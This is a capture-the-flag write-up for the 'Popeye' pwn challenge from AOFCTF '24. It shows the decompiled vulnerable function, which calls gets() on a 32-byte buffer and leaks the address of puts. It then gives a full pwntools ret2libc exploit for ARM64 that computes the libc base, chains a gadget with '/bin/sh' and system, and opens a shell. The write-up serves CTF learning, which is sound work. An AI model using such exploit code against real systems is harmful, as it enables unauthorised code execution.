@@ -1,0 +1,56 @@
+---
+title: AOFCTF '24 - Pwn - Popeye
+date: '2024-04-29'
+tags: ['pwn', 'aofctf', 'arm', 'ret2libc']
+draft: false
+summary: Given a libc leak, perform a ret2libc on ARM64.
+---
+
+## Challenge Description
+
+![alt text](/static/writeups/aofctf-24/image-8.png)
+
+## Solution
+
+Popeye was probably the most easiest challenge in AOFCTF, we already had a Libc leak, so we didn't have to do much. Also, it had a straight forward buffer overflow. But, since it was on ARM, most people didn't even try it :((( :welp:
+
+I don't think I even need to explain this chall, so I'll just paste the solve script here, the decompiled code:
+
+```c
+void vuln(void)
+{
+  char acStack_20 [32];
+
+  printf("[To make it easier: %p]\n",puts);
+  gets(acStack_20);
+  return;
+}
+```
+
+To solve script is:
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+elf = context.binary = ELF("./popeye")
+io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
+libc = ELF("./libc.so.6")
+
+io.recvuntil(b": ")
+libc.address = int(io.recvuntil(b"]")[:-1], 16) - libc.sym.puts
+info("libc @ %#x" % libc.address)
+payload = flat(
+    cyclic(40, n=8),
+    0x0000000000400944,
+    next(libc.search(b"/bin/sh\x00")),
+    libc.sym.system
+)
+
+io.sendline(payload)
+io.interactive()
+```
+
+> You just had to extract the LIBC from the provided dockerfile (you could get the aarch64 libc using my script ;))
